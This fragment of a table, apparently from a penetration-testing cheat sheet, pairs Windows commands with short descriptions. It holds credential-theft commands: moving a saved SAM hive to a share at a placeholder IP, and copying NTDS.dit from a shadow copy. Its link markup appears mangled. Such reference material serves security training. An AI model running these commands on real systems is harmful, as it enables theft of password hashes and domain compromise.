...
|move sam.save [\\<ip>\NameofFileShare](file://%3cip%3e/NameofFileShare)|Uses move in Windows to transfer a file to a specified file share over the network.|
...
|cmd.exe /c copy [\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit](file://%3f/GLOBALROOT/Device/HarddiskVolumeShadowCopy2/Windows/NTDS/NTDS.dit) c:\NTDS\NTDS.dit|Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.|
